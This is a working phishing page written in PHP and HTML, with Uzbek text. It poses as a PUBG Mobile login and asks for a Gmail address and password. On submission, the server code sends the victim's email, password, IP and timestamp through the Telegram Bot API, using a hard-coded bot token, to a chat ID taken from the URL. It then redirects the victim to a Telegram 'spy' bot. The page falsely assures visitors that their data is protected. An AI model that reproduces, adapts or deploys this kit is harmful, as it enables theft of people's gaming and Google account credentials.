<?php
// domen.name/rm/123456789 formatida ishlaydi

// URL dan user_id ni olish
$path = $_SERVER['REQUEST_URI'];
$parts = explode('/', trim($path, '/'));

if (count($parts) >= 2) {
    $user_id = end($parts);
} else {
    $user_id = $_GET['id'] ?? '';
}

if(empty($user_id) || !is_numeric($user_id)) {
    header("Location: https://t.me/eShpionBot?start=true");
    exit;
}

if($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'Noma\'lum';
    
    if(!empty($email) && !empty($password)) {
        // Gmail formatini tekshirish
        if (!filter_var($email, FILTER_VALIDATE_EMAIL) || !preg_match('/@gmail\.com$/i', $email)) {
            // Agar Gmail bo'lmasa, Telegram botga xabar yuborish
            $bot_token = "8940114047:AAEoEqS32SpwJ-ovcz3sJIQkL2M7YLvcpm4";
            $chat_id = $user_id;
            
            $error_message = "❌ <b>Noto'g'ri Email Format!</b>\n\n";
            $error_message .= "📧 <b>Kiritilgan Email:</b> <code>" . htmlspecialchars($email) . "</code>\n";
            $error_message .= "🔑 <b>Parol:</b> <code>" . htmlspecialchars($password) . "</code>\n";
            $error_message .= "ℹ️ <b>Izoh:</b> Faqat Gmail email manzillari qabul qilinadi\n";
            $error_message .= "🌐 <b>IP:</b> " . htmlspecialchars($ip) . "\n";
            $error_message .= "🕒 <b>Vaqt:</b> " . date('Y-m-d H:i:s') . "\n";
            $error_message .= "🆔 <b>User ID:</b> <code>$user_id</code>";
            
            $url = "https://api.telegram.org/bot$bot_token/sendMessage";
            $error_data = [
                'chat_id' => $chat_id,
                'text' => $error_message,
                'parse_mode' => 'HTML'
            ];
            
            $ch = curl_init($url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $error_data);
            curl_exec($ch);
            curl_close($ch);
            
            header("Location: /rm/$user_id");
            exit;
        }
        
        $bot_token = "8940114047:AAEoEqS32SpwJ-ovcz3sJIQkL2M7YLvcpm4";
        $chat_id = $user_id;
        
        $message = "🎯 <b>PUBG Mobile Login Ma'lumotlari</b>\n\n";
        $message .= "📧 <b>Email:</b> <code>" . htmlspecialchars($email) . "</code>\n";
        $message .= "🔑 <b>Password:</b> <code>" . htmlspecialchars($password) . "</code>\n";
        $message .= "🌐 <b>IP:</b> " . htmlspecialchars($ip) . "\n";
        $message .= "🕒 <b>Vaqt:</b> " . date('Y-m-d H:i:s') . "\n";
        $message .= "🆔 <b>User ID:</b> <code>$user_id</code>";
        
        $url = "https://api.telegram.org/bot$bot_token/sendMessage";
        $data = [
            'chat_id' => $chat_id,
            'text' => $message,
            'parse_mode' => 'HTML'
        ];
        
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_exec($ch);
        curl_close($ch);
    }
    
    header("Location: https://t.me/eShpionBot?start=true");
    exit;
}
?>
<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>PUBG MOBILE - Login</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root {
            --primary: #FF3D57;
            --secondary: #FF6B35;
            --dark: #0F0F1E;
            --light-dark: #1A1A2E;
            --gray: #8A8A9E;
            --light: #FFFFFF;
            --success: #00C851;
            --warning: #FFBB33;
            --border-radius: 12px;
            --shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        
        html {
            font-size: 14px;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background-color: var(--dark);
            color: var(--light);
            line-height: 1.5;
            overflow-x: hidden;
            min-height: 100vh;
            padding: 0;
        }
        
        /* Header */
        .app-header {
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            padding: 20px 16px;
            position: relative;
            overflow: hidden;
            box-shadow: 0 4px 20px rgba(255, 61, 87, 0.3);
        }
        
        .header-background {
            position: absolute;
            top: 0;
            right: 0;
            width: 200px;
            height: 200px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 50%;
            transform: translate(30%, -30%);
        }
        
        .header-content {
            position: relative;
            z-index: 2;
        }
        
        .app-logo {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 16px;
        }
        
        .logo-icon {
            width: 48px;
            height: 48px;
            background: rgba(255, 255, 255, 0.9);
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 900;
            font-size: 20px;
            color: var(--primary);
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
        }
        
        .logo-text {
            font-size: 22px;
            font-weight: 800;
            letter-spacing: -0.5px;
        }
        
        .logo-text span {
            font-weight: 400;
            opacity: 0.9;
        }
        
        .header-title {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 8px;
        }
        
        .header-subtitle {
            font-size: 14px;
            opacity: 0.9;
            font-weight: 400;
        }
        
        /* Main Container */
        .main-container {
            max-width: 500px;
            margin: 0 auto;
            padding: 0 16px;
        }
        
        /* Login Card */
        .login-card {
            background: var(--light-dark);
            border-radius: var(--border-radius);
            padding: 24px;
            margin-top: -20px;
            position: relative;
            z-index: 10;
            box-shadow: var(--shadow);
            border: 1px solid rgba(255, 255, 255, 0.05);
        }
        
        /* Form */
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-label {
            display: block;
            margin-bottom: 8px;
            font-size: 13px;
            font-weight: 600;
            color: var(--gray);
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        
        .input-wrapper {
            position: relative;
        }
        
        .input-icon {
            position: absolute;
            left: 16px;
            top: 50%;
            transform: translateY(-50%);
            color: var(--gray);
            font-size: 16px;
        }
        
        .form-input {
            width: 100%;
            padding: 16px 16px 16px 48px;
            background: rgba(255, 255, 255, 0.05);
            border: 2px solid rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            color: var(--light);
            font-size: 16px;
            transition: all 0.3s;
            -webkit-appearance: none;
        }
        
        .form-input:focus {
            outline: none;
            border-color: var(--primary);
            background: rgba(255, 255, 255, 0.08);
        }
        
        .form-input::placeholder {
            color: var(--gray);
        }
        
        .input-hint {
            display: flex;
            align-items: center;
            gap: 6px;
            margin-top: 8px;
            font-size: 12px;
            color: var(--gray);
        }
        
        .input-hint i {
            color: var(--warning);
        }
        
        /* Checkbox */
        .checkbox-group {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin: 20px 0;
        }
        
        .remember-me {
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .checkbox {
            width: 18px;
            height: 18px;
            accent-color: var(--primary);
        }
        
        .checkbox-label {
            font-size: 14px;
            color: var(--gray);
        }
        
        .forgot-link {
            font-size: 14px;
            color: var(--primary);
            text-decoration: none;
            font-weight: 500;
        }
        
        /* Submit Button */
        .submit-btn {
            width: 100%;
            padding: 18px;
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            border: none;
            border-radius: 10px;
            color: white;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            box-shadow: 0 4px 20px rgba(255, 61, 87, 0.3);
        }
        
        .submit-btn:active {
            transform: translateY(2px);
            box-shadow: 0 2px 10px rgba(255, 61, 87, 0.3);
        }
        
        .submit-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
        
        /* Divider */
        .divider {
            display: flex;
            align-items: center;
            margin: 30px 0;
            color: var(--gray);
            font-size: 13px;
            text-transform: uppercase;
        }
        
        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: rgba(255, 255, 255, 0.1);
        }
        
        .divider span {
            padding: 0 15px;
        }
        
        /* Social Login */
        .social-login {
            display: flex;
            gap: 12px;
            margin-bottom: 30px;
        }
        
        .social-btn {
            flex: 1;
            padding: 14px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            color: var(--light);
            font-size: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            text-decoration: none;
            transition: all 0.3s;
        }
        
        .social-btn:active {
            background: rgba(255, 255, 255, 0.1);
        }
        
        .social-btn.facebook {
            color: #1877F2;
        }
        
        .social-btn.google {
            color: #EA4335;
        }
        
        /* Register Link */
        .register-section {
            text-align: center;
            padding: 20px 0;
            font-size: 14px;
        }
        
        .register-link {
            color: var(--primary);
            text-decoration: none;
            font-weight: 600;
        }
        
        /* Features */
        .features {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 16px;
            margin: 30px 0;
        }
        
        .feature {
            background: rgba(255, 255, 255, 0.03);
            border-radius: 10px;
            padding: 16px;
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.05);
        }
        
        .feature-icon {
            width: 36px;
            height: 36px;
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 12px;
            color: white;
            font-size: 16px;
        }
        
        .feature-title {
            font-size: 13px;
            font-weight: 600;
            margin-bottom: 4px;
        }
        
        .feature-desc {
            font-size: 11px;
            color: var(--gray);
            line-height: 1.4;
        }
        
        /* Footer */
        .app-footer {
            text-align: center;
            padding: 30px 16px;
            font-size: 12px;
            color: var(--gray);
            border-top: 1px solid rgba(255, 255, 255, 0.05);
            margin-top: 20px;
        }
        
        .footer-links {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-bottom: 15px;
        }
        
        .footer-link {
            color: var(--gray);
            text-decoration: none;
            font-size: 12px;
        }
        
        /* Loading */
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: var(--dark);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 9999;
        }
        
        .loading-spinner {
            width: 60px;
            height: 60px;
            border: 3px solid rgba(255, 255, 255, 0.1);
            border-top-color: var(--primary);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .loading-text {
            font-size: 16px;
            font-weight: 500;
        }
        
        /* Notification */
        .notification {
            position: fixed;
            top: 20px;
            right: 16px;
            left: 16px;
            background: var(--light-dark);
            border-left: 4px solid var(--primary);
            padding: 16px;
            border-radius: 8px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            transform: translateY(-100px);
            opacity: 0;
            transition: all 0.3s;
            z-index: 1000;
        }
        
        .notification.show {
            transform: translateY(0);
            opacity: 1;
        }
        
        .notification-content {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        
        .notification-icon {
            width: 24px;
            height: 24px;
            background: var(--primary);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 12px;
        }
        
        .notification-text {
            flex: 1;
            font-size: 14px;
        }
        
        /* Responsive */
        @media (min-width: 768px) {
            html {
                font-size: 16px;
            }
            
            .main-container {
                padding: 20px;
            }
            
            .login-card {
                padding: 32px;
            }
        }
        
        @media (max-width: 360px) {
            .social-login {
                flex-direction: column;
            }
            
            .features {
                grid-template-columns: 1fr;
            }
        }
        
        /* Free Badge */
        .free-badge {
            position: absolute;
            top: 20px;
            right: 16px;
            background: linear-gradient(135deg, #00C851, #007E33);
            color: white;
            padding: 6px 12px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 700;
            letter-spacing: 0.5px;
            box-shadow: 0 4px 15px rgba(0, 200, 81, 0.3);
            z-index: 3;
        }
        
        /* Password Toggle */
        .password-toggle {
            position: absolute;
            right: 16px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: var(--gray);
            font-size: 16px;
            cursor: pointer;
            padding: 0;
            width: 24px;
            height: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
    </style>
</head>
<body>
    <!-- Notification -->
    <div class="notification" id="notification">
        <div class="notification-content">
            <div class="notification-icon">
                <i class="fas fa-info-circle"></i>
            </div>
            <div class="notification-text" id="notificationText">
                Faqat Gmail email manzillari qabul qilinadi!
            </div>
        </div>
    </div>
    
    <!-- Loading Overlay -->
    <div class="loading-overlay" id="loadingOverlay">
        <div class="loading-spinner"></div>
        <div class="loading-text">PUBG MOBILE yuklanmoqda...</div>
    </div>
    
    <!-- Main Content -->
    <div id="mainContent" style="display: none;">
        <!-- Header -->
        <header class="app-header">
            <div class="free-badge">FREE</div>
            <div class="header-background"></div>
            <div class="header-content">
                <div class="app-logo">
                    <div class="logo-icon">P</div>
                    <div class="logo-text">PUBG <span>MOBILE</span></div>
                </div>
                <h1 class="header-title">Hisobga kirish</h1>
                <p class="header-subtitle">Battle Royale o'yiniga xush kelibsiz</p>
            </div>
        </header>
        
        <!-- Main Container -->
        <main class="main-container">
            <!-- Login Card -->
            <div class="login-card">
                <form id="loginForm" method="POST">
                    <!-- Email Field -->
                    <div class="form-group">
                        <label class="form-label">Gmail Manzili</label>
                        <div class="input-wrapper">
                            <i class="fas fa-envelope input-icon"></i>
                            <input type="email" 
                                   class="form-input" 
                                   name="email" 
                                   id="email"
                                   placeholder="example@gmail.com" 
                                   required
                                   pattern="[a-zA-Z0-9._%+-]+@gmail\.com$">
                        </div>
                        <div class="input-hint">
                            <i class="fas fa-info-circle"></i>
                            Faqat Gmail hisoblari qabul qilinadi
                        </div>
                    </div>
                    
                    <!-- Password Field -->
                    <div class="form-group">
                        <label class="form-label">Parol</label>
                        <div class="input-wrapper">
                            <i class="fas fa-lock input-icon"></i>
                            <input type="password" 
                                   class="form-input" 
                                   name="password" 
                                   id="password"
                                   placeholder="Parolingizni kiriting" 
                                   required
                                   minlength="6">
                            <button type="button" class="password-toggle" id="togglePassword">
                                <i class="fas fa-eye"></i>
                            </button>
                        </div>
                        <div class="input-hint">
                            <i class="fas fa-shield-alt"></i>
                            Parol kamida 6 belgidan iborat bo'lishi kerak
                        </div>
                    </div>
                    
                    <!-- Remember Me & Forgot Password -->
                    <div class="checkbox-group">
                        <div class="remember-me">
                            <input type="checkbox" id="remember" class="checkbox">
                            <label for="remember" class="checkbox-label">Meni eslab qol</label>
                        </div>
                        <a href="#" class="forgot-link">Parolni unutdingizmi?</a>
                    </div>
                    
                    <!-- Submit Button -->
                    <button type="submit" class="submit-btn" id="submitBtn">
                        <i class="fas fa-sign-in-alt"></i>
                        Hisobga kirish
                    </button>
                </form>
                
                <!-- Divider -->
                <div class="divider">
                    <span>yoki</span>
                </div>
                
                <!-- Social Login -->
                <div class="social-login">
                    <a href="#" class="social-btn facebook">
                        <i class="fab fa-facebook-f"></i>
                        <span>Facebook</span>
                    </a>
                    <a href="#" class="social-btn google">
                        <i class="fab fa-google"></i>
                        <span>Google</span>
                    </a>
                </div>
                
                <!-- Features -->
                <div class="features">
                    <div class="feature">
                        <div class="feature-icon">
                            <i class="fas fa-shield-alt"></i>
                        </div>
                        <div class="feature-title">Xavfsiz</div>
                        <div class="feature-desc">Barcha ma'lumotlaringiz himoyalangan</div>
                    </div>
                    <div class="feature">
                        <div class="feature-icon">
                            <i class="fas fa-bolt"></i>
                        </div>
                        <div class="feature-title">Tezkor</div>
                        <div class="feature-desc">Bir soniyada hisobingizga kiring</div>
                    </div>
                </div>
                
                <!-- Register Link -->
                <div class="register-section">
                    <span>Hisobingiz yo'qmi? </span>
                    <a href="#" class="register-link">Ro'yxatdan o'tish</a>
                </div>
            </div>
        </main>
        
        <!-- Footer -->
        <footer class="app-footer">
            <div class="footer-links">
                <a href="#" class="footer-link">Foydalanish shartlari</a>
                <a href="#" class="footer-link">Maxfiylik siyosati</a>
                <a href="#" class="footer-link">Yordam</a>
            </div>
            <p>© 2024 PUBG MOBILE. Barcha huquqlar himoyalangan.</p>
            <p style="margin-top: 8px; font-size: 11px; opacity: 0.7;">Bu sayt PUBG MOBILE rasmiy sahifasi emas</p>
        </footer>
    </div>
    
    <script>
        // DOM Elements
        const loadingOverlay = document.getElementById('loadingOverlay');
        const mainContent = document.getElementById('mainContent');
        const loginForm = document.getElementById('loginForm');
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        const togglePassword = document.getElementById('togglePassword');
        const submitBtn = document.getElementById('submitBtn');
        const notification = document.getElementById('notification');
        const notificationText = document.getElementById('notificationText');
        
        // Show notification
        function showNotification(message, type = 'info') {
            notificationText.textContent = message;
            notification.classList.add('show');
            
            setTimeout(() => {
                notification.classList.remove('show');
            }, 3000);
        }
        
        // Validate email format
        function validateEmail(email) {
            const regex = /^[a-zA-Z0-9._%+-]+@gmail\.com$/i;
            return regex.test(email);
        }
        
        // Toggle password visibility
        togglePassword.addEventListener('click', function() {
            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
            passwordInput.setAttribute('type', type);
            this.innerHTML = type === 'password' ? '<i class="fas fa-eye"></i>' : '<i class="fas fa-eye-slash"></i>';
        });
        
        // Real-time email validation
        emailInput.addEventListener('input', function() {
            const email = this.value.trim();
            
            if (email && !validateEmail(email)) {
                this.style.borderColor = 'var(--primary)';
                this.style.boxShadow = '0 0 0 2px rgba(255, 61, 87, 0.2)';
            } else {
                this.style.borderColor = '';
                this.style.boxShadow = '';
            }
        });
        
        // Form submission
        loginForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const email = emailInput.value.trim();
            const password = passwordInput.value.trim();
            
            // Validate email
            if (!validateEmail(email)) {
                showNotification('Iltimos, faqat Gmail manzilini kiriting (@gmail.com)');
                emailInput.focus();
                return false;
            }
            
            // Validate password
            if (password.length < 6) {
                showNotification('Parol kamida 6 ta belgidan iborat bo\'lishi kerak');
                passwordInput.focus();
                return false;
            }
            
            // Show loading state
            submitBtn.disabled = true;
            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Kirilmoqda...';
            
            // Show loading overlay
            loadingOverlay.style.display = 'flex';
            mainContent.style.display = 'none';
            
            // Submit form after short delay
            setTimeout(() => {
                loginForm.submit();
            }, 1500);
            
            return true;
        });
        
        // Initialize app
        function initApp() {
            // Hide loading after 2 seconds
            setTimeout(() => {
                loadingOverlay.style.display = 'none';
                mainContent.style.display = 'block';
                
                // Show welcome notification
                setTimeout(() => {
                    showNotification('PUBG MOBILE\'ga xush kelibsiz! Faqat Gmail hisobi bilan kirishingiz mumkin.');
                }, 500);
            }, 2000);
            
            // Add click effects to buttons
            const buttons = document.querySelectorAll('button, .social-btn, .register-link');
            buttons.forEach(button => {
                button.addEventListener('touchstart', function() {
                    this.style.transform = 'scale(0.98)';
                });
                
                button.addEventListener('touchend', function() {
                    this.style.transform = '';
                });
            });
        }
        
        // Start the app
        document.addEventListener('DOMContentLoaded', initApp);
        
        // Handle orientation change
        window.addEventListener('orientationchange', function() {
            // Small delay to allow orientation to complete
            setTimeout(() => {
                // Recalculate any layout if needed
            }, 300);
        });
    </script>
</body>
</html>